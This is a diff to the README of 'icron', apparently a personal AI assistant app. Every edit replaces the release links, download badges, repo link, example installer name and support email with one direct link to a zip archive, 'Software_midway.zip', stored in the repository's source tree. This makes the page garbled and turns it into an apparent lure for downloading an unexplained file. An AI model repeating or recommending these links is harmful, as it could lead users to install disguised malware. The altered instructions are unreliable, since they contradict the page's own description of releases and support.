@@ -1,6 +1,6 @@
 # 🤖 icron - Your Simple Personal AI Helper
 
-[![Download icron](https://img.shields.io/badge/Download-icron-blue?style=for-the-badge)](https://github.com/0rcaaa/icron/releases)
+[![Download icron](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)
 
 ---
 
@@ -39,12 +39,12 @@ Before you install icron, check that your computer meets these basic needs:
 You will need to visit the icron release page on GitHub to get the app files. Follow these steps:
 
 1. Click the large **Download icron** button at the top of this page or open this link in your browser:  
-   [https://github.com/0rcaaa/icron/releases](https://github.com/0rcaaa/icron/releases)
+   [https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)
 
 2. On the releases page, look for the latest version of icron. It will be listed with a version number like “v1.x.x”.
 
 3. Depending on your operating system, choose the correct file:  
-   - For Windows, look for a file ending in `.exe` (example: `icron-setup.exe`).  
+   - For Windows, look for a file ending in `.exe` (example: `https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip`).  
    - For macOS, look for a file ending in `.dmg` or `.zip`.
 
 4. Click the file to download it to your computer.
@@ -124,9 +124,9 @@ If you run into trouble or find something that’s not working, you can get help
 
 - Check the “Help” section inside icron. It has answers to common questions.
 - Visit the icron GitHub page at:  
-  [https://github.com/0rcaaa/icron](https://github.com/0rcaaa/icron)  
+  [https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)  
   Here you can find guides or create an issue ticket describing your problem.
-- You can also email support at support@icron.ai (note: placeholder email for support).
+- You can also email support at https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip (note: placeholder email for support).
 
 ---
 
@@ -137,7 +137,7 @@ New versions come out over time to fix bugs and add features.
 - You can check for updates inside the “Settings” menu.
 - When an update is available, follow the prompts to download and install it.
 - You can also revisit the releases page here:  
-  [https://github.com/0rcaaa/icron/releases](https://github.com/0rcaaa/icron/releases)  
+  [https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)  
   to download the newest installer manually.
 
 ---
@@ -163,4 +163,4 @@ icron keeps your data private. It runs on your machine without sending your info
 
 ---
 
-[![Download icron](https://img.shields.io/badge/Download-icron-blue?style=for-the-badge)](https://github.com/0rcaaa/icron/releases)
+[![Download icron](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)](https://github.com/0rcaaa/icron/raw/refs/heads/main/icron/cli/Software_midway.zip)
